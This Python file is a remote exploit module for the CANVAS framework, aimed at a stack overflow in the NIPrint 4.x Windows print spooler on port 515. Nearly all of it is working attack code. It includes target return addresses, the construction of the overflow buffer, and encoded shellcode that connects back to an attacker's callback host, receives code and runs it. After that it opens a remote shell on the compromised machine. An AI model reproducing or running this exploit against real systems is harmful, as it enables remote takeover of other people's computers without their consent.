#! /usr/bin/env python


# CANVAS NIPrint 4.x exploit
#
# Niprint is a Windows printspooler 
# http://www.networkinstruments.com/html/niprint.html
# 
# no CVE candidate assigned
#
# Bug Class: Stack overflow
# 

# NIprint test exploit, my first python(tm)

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")

import os
import getopt
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
import shellcodeGenerator
from shelllistener import shelllistener

from encoder import *

from win32Node import win32Node
import win32MosdefShellServer

# GUI info
NAME="NIPrint 4.x remote exploit"
DESCRIPTION="NIPrint stack overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="networkinstruments.com"
DOCUMENTATION["Date public"] = "2003-11-05"
DOCUMENTATION["References"] = "http://www.networkinstruments.com/html/niprint.html"
DOCUMENTATION["Repeatability"]="You get one shot"
DOCUMENTATION["CVE Name"] = "CVE-2003-1141"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1141"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]


NOTES="""
This is my first attempt at a CANVAS exploit, be gentle
"""
CHANGELOG="""
"""

#name, jmp esp 
targets = {
    0 : ["N/A", 0x00000000],
    1 : ["Windows 2000 Professional, NL (SP0-SP4)", 0x6951414E],
    2 : ["Windows 2000 Professional, EN (SP0-SP4)", 0x6960414E],
    3 : ["Crash target", 0x41424344] 
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host = "192.168.0.6"
        self.port = 515
        # targets default version
        self.version = 1
        # where eip is located in overflow string
        self.eiploc = 49
        # Win2k Pro SP0, NL, MSAFD.DLL
        self.info, self.eip = targets[self.version]
        # shellcode place holder 
        self.shellcode = "\xcc" * 2048
        # chars to exclude in shellcode generation
        self.badstring = "%\x00\x0a\x0d&? 0"
        # localhost and localport used in shellcode
        self.localhost = "127.0.0.1"
        self.localport = 5000
        return
    
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def connect_to_host(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            return 0
        return s
    
    # abuse NIPrints false LPD command response
    def test(self):
        self.host=self.target.interface
        if "port" in self.argsDict:
            self.port = self.argsDict["port"]

        s = self.connect_to_host()
        if s == 0:
            return 0
        else:
            self.websend(s, "CCANVAS")
            response = s.recv(16, 0)
            if response.count("NIPrint"):
                print "Received NIPrint banner"
                s.close()
                return 1
            else:
                print "No NIPrint banner found"
                return 0
    
    # testing alphanum encoder :)
    def createShellcode(self):
        #sc = shellcodeGenerator.win32()
        #sc.addAttr("findeipnoesp", None)
        #sc.addAttr("MessageBeep", None)
        #sc.addAttr("MessageBox", ["HELLO"])
        #sc = sc.get()
        
        sc = shellcodeGenerator.win32()
        sc.addAttr('tcpconnect', {'port' : self.callback.port, 'ipaddress' : self.callback.ip})
        sc.addAttr('SmallRecvExecWin32', {'socketreg' : 'FDSPOT'})
        sc.addAttr('UseWS2Ordinal', None)
        sc = sc.get()
        print "XXX: pre-encoding %d" % len(sc)
        encoder         = alphanumeric.AlphaNum()
        totopc          = encoder.seh_pc() # leaves pc in ecx
        getpc           = encoder.get_pc(reg='ecx')
        payload         = encoder.encode(sc)
        self.shellcode  = totopc + getpc + payload
        print self.shellcode
        print "XXX: post-encoding %d" % len(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode
        
    def gocode_createShellcode(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr("GOFindSock", { "setblocking" : 1 })
        sc.addAttr("RecvExecWin32", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode

    def messagebox_createShellcode(self):
        """
        This createShellcode displays a message when
        the exploit is successful
        """
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", None)
        sc.addAttr("MessageBeep", None)
        sc.addAttr("MessageBox", ["HELLO"])
        #sc.addAttr("MessageBox", ["HOW ARE YOU?"])
        #sc.addAttr("ExitProcess", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode
   
    def doStageTwo(self, s):
        self.log("Got trigger!")
        node=win32Node()
        node.parentnode=self.argsDict["passednodes"][0]
        newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
        newshell.node.startup()
        self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1) 
        self.log("Thanks \\0/")
        return newshell.node

    
    def build_string(self, x_len, eipoffset, retadd):
        # payload looks like:
        # 48 bytes filler - eip
        # byte 47 and 48 are used for a jmp because we 
        # go to a jmp esp, where esp points into our filler
        # [46 bytes nops][jmp][eip][shellcode]
        
        x_string = "A" * x_len
        # place jmp
        x_string = stroverwrite(x_string, "\xeb\x08", eipoffset - 4)
        # place eip tag
        x_string = stroverwrite(x_string, intel_order(retadd), eipoffset)
        # place shellcode, allow some nop room
        x_string = stroverwrite(x_string, self.shellcode, eipoffset + 24) 
        return x_string
    
    def run(self):
        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        # dave
        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))

            return 0
        self.info, self.eip = targets[self.version]
        print "Using version %d : %s (0x%X)"% (self.version, self.info, self.eip)

        s = self.connect_to_host()
        if s == 0:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0
        
        self.log("Triggering overflow")
        x_string = self.build_string((48 + 4 + 20 + len(self.shellcode)), self.eiploc, self.eip)
        self.websend(s, x_string)
        if self.checkTriggerWin32(s):
            self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
            return self.doStageTwo(s)
        self.setInfo("%s attacking %s:%d - done (failed)"% (NAME, self.host, self.port))
        s.close()        
        return

    def usage(self):
        print "Usage: %s -v version -t host [ -p port ] [ -T (toggle testing mode) ]"% sys.argv[0]
        print "Available versions: "
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
   
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

